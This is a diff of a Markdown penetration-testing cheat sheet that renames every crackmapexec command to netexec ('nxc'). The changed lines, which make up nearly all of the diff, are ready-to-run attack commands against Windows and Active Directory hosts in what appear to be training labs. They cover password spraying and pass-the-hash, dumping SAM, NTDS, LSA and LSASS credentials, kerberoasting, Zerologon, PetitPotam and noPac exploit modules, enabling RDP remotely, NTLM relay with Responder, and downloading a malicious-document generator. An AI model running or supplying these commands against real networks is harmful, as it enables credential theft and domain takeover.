@@ -49,7 +49,7 @@
   - [Brute Force](#brute-force)
   - [hashcrack](#hashcrack)
   - [Windows](#windows-2)
-    - [crackmap](#crackmap)
+    - [netexec](#netexec)
     - [PsMapexec](#psmapexec)
     - [kerbrute](#kerbrute)
     - [mimikatz](#mimikatz)
@@ -534,9 +534,9 @@ pip install ezodf
 wget https://github.com/rmdavy/badodf/raw/master/badodt.py
 python3 badodt.py
 ```
-crackmapexec
+netexec
 ```bash
-crackmapexec smb 172.16.117.3 -u  -p '' -M slinky -o SERVER=172.16.117.30 NAME=important
+nxc smb 172.16.117.3 -u  -p '' -M slinky -o SERVER=172.16.117.30 NAME=important
 ```
 
 ## Other Bypass
@@ -650,15 +650,15 @@ john --wordlist=/usr/share/wordlists/rockyou.txt --rules /usr/share/john/rules/b
 john --wordlist=/usr/share/wordlists/fasttrack.txt --rules /usr/share/john/rules/best64.rule hash
 ```
 ## Windows
-### crackmap
+### netexec
 ```bash
 # Module list
-crackmapexec ldap -L
+nxc ldap -L
 ## Nomal
-crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success --local-auth --loggedon-users
-crackmapexec smb 192.168.226.189 192.168.226.191 192.168.226.248-249 -u user -H 54abdf854d8c0653b1be3458454e4a3b -d htb.local --continue-on-success
-crackmapexec smb 10.129.144.138 -u "guest" -p "" --rid-brute --pass-pol
-crackmapexec smb 10.129.144.138 -u user_list -p user_list --no-brute
+nxc smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success --local-auth --loggedon-users
+nxc smb 192.168.226.189 192.168.226.191 192.168.226.248-249 -u user -H 54abdf854d8c0653b1be3458454e4a3b -d htb.local --continue-on-success
+nxc smb 10.129.144.138 -u "guest" -p "" --rid-brute --pass-pol
+nxc smb 10.129.144.138 -u user_list -p user_list --no-brute
 
 # SMB share
 nxc smb 10.129.204.177 -u username -p 'Nexus123!' -d inlanefreight.htb --shares
@@ -666,21 +666,21 @@ nxc smb 10.129.204.177 -u username -p 'Nexus123!' -d inlanefreight.htb --spider 
 nxc smb 10.129.204.177 -u username -p 'Nexus123!' -d inlanefreight.htb --share serviceaccount --get-file flag.txt flag.txt
 
 # pass-pol
-crackmapexec smb 10.129.204.177  -u '' -p '' --pass-pol
+nxc smb 10.129.204.177  -u '' -p '' --pass-pol
 
 # GPP
 ## gpp-decryp cmd
-crackmapexec smb 192.168.50.75 -u username -p 'Nexus123!' -M gpp_password
-crackmapexec smb 192.168.50.75 -u username -p 'Nexus123!' -M gpp_autologin
+nxc smb 192.168.50.75 -u username -p 'Nexus123!' -M gpp_password
+nxc smb 192.168.50.75 -u username -p 'Nexus123!' -M gpp_autologin
 
 # asreproast
-crackmapexec ldap dc01.inlanefreight.htb -u username -p 'Nexus123!' --asreproast asreproast2.out
+nxc ldap dc01.inlanefreight.htb -u username -p 'Nexus123!' --asreproast asreproast2.out
 # kerberoasting
-crackmapexec ldap dc01.inlanefreight.htb -u username -p 'Nexus123!' --kerberoasting kerberoasting.out
+nxc ldap dc01.inlanefreight.htb -u username -p 'Nexus123!' --kerberoasting kerberoasting.out
 # Kerberos Unconstrained Delegation
-crackmapexec ldap dc01.inlanefreight.htb -u username -p 'Nexus123!' --trusted-for-delegation
+nxc ldap dc01.inlanefreight.htb -u username -p 'Nexus123!' --trusted-for-delegation
 # No password
-crackmapexec ldap 10.129.204.177 -u username -p 'Nexus123!' -d inlanefreight.htb --password-not-required
+nxc ldap 10.129.204.177 -u username -p 'Nexus123!' -d inlanefreight.htb --password-not-required
 
 # MSSQL
 nxc mssql 172.16.15.15 -u sql -p 'Nexus123!' --local-auth -M mssql_priv
@@ -693,34 +693,34 @@ nxc mssql 172.16.15.15 -u sql -p 'Nexus123!' --local-auth -q "SELECT * from [dbn
 nxc mssql 172.16.15.15 -u sql -p 'Nexus123!' --local-auth -M mssql_priv -o ACTION=rollback
 
 # sid
-crackmapexec ldap dc01.inlanefreight.htb -u username -p 'Nexus123!' --get-sid
+nxc ldap dc01.inlanefreight.htb -u username -p 'Nexus123!' --get-sid
 # MS-DS-Machine-Account-Quota
-crackmapexec ldap dc01.inlanefreight.htb -u username -p 'Nexus123!' -M maq
+nxc ldap dc01.inlanefreight.htb -u username -p 'Nexus123!' -M maq
 # gMSA
-crackmapexec ldap dc01.inlanefreight.htb -u username -p 'Nexus123!' --gmsa
+nxc ldap dc01.inlanefreight.htb -u username -p 'Nexus123!' --gmsa
 # laps
-crackmapexec ldap dc01.inlanefreight.htb -u username -p 'Nexus123!' -M laps
+nxc ldap dc01.inlanefreight.htb -u username -p 'Nexus123!' -M laps
 
 # secret dump
-crackmapexec smb 10.129.204.177 -u username -p 'Nexus123!' --sam
-crackmapexec smb 10.129.204.177 -u username -p 'Nexus123!' --ntds --enabled
-crackmapexec smb 10.129.204.177 -u username -p 'Nexus123!' --lsa 
-crackmapexec smb 10.129.204.177 -u username -p 'Nexus123!' -M lsassy
-crackmapexec smb 10.129.204.177 -u username -p 'Nexus123!' -M handlekatz
-crackmapexec smb 10.129.204.177 -u username -p 'Nexus123!' -M nanodump
+nxc smb 10.129.204.177 -u username -p 'Nexus123!' --sam
+nxc smb 10.129.204.177 -u username -p 'Nexus123!' --ntds --enabled
+nxc smb 10.129.204.177 -u username -p 'Nexus123!' --lsa 
+nxc smb 10.129.204.177 -u username -p 'Nexus123!' -M lsassy
+nxc smb 10.129.204.177 -u username -p 'Nexus123!' -M handlekatz
+nxc smb 10.129.204.177 -u username -p 'Nexus123!' -M nanodump
 ## KeePass
-crackmapexec smb 10.129.203.121 -u username -p 'Nexus123!' -M keepass_discover
+nxc smb 10.129.203.121 -u username -p 'Nexus123!' -M keepass_discover
 nxc smb 10.129.105.44 -u username -p 'Nexus123!' -M keepass_trigger -o ACTION=ALL KEEPASS_CONFIG_PATH=C:/Users/CreatePass/KeePass.config.xml
 cat /tmp/export.xml | grep -i protectinmemory -5
 
 ## Vuln
-crackmapexec smb 10.129.203.121 -u username -p 'Nexus123!' -M Zerologon
-crackmapexec smb 10.129.203.121 -u username -p 'Nexus123!' -M PetitPotam
-crackmapexec smb 10.129.203.121 -u username -p 'Nexus123!' -M nopac
+nxc smb 10.129.203.121 -u username -p 'Nexus123!' -M Zerologon
+nxc smb 10.129.203.121 -u username -p 'Nexus123!' -M PetitPotam
+nxc smb 10.129.203.121 -u username -p 'Nexus123!' -M nopac
 
 ## Enable RDP
-crackmapexec smb 10.129.203.121 -u username -p 'Nexus123!' -M rdp -o ACTION=enable
-crackmapexec smb 10.129.203.121 -u username -p 'Nexus123!' -M rdp -o ACTION=disable
+nxc smb 10.129.203.121 -u username -p 'Nexus123!' -M rdp -o ACTION=enable
+nxc smb 10.129.203.121 -u username -p 'Nexus123!' -M rdp -o ACTION=disable
 ```
 ### PsMapexec
 ```powershell
@@ -834,7 +834,7 @@ Enter-PSSession ws01.inlanefreight.local
 ## NTLM Relay 
 ```bash
 # Enum target SMB
-crackmapexec smb 172.16.117.0/24 --gen-relay-list relayTargets.txt
+nxc smb 172.16.117.0/24 --gen-relay-list relayTargets.txt
 # Responder
 sed -i "s/SMB = On/SMB = Off/; s/HTTP = On/HTTP = Off/" /etc/responder/Responder.conf
 responder -I tun0
@@ -1577,7 +1577,7 @@ python3 noPac.py htb.local/svc_test:testpass -dc-ip 172.16.5.5  -dc-host ACADEMY
 ### ADCS
 ```bash
 # find service
-crackmapexec ldap 172.16.117.0/24 -u  -p '' -M adcs
+nxc ldap 172.16.117.0/24 -u  -p '' -M adcs
 ```
 
 https://github.com/secure-77/Certipy-Docker
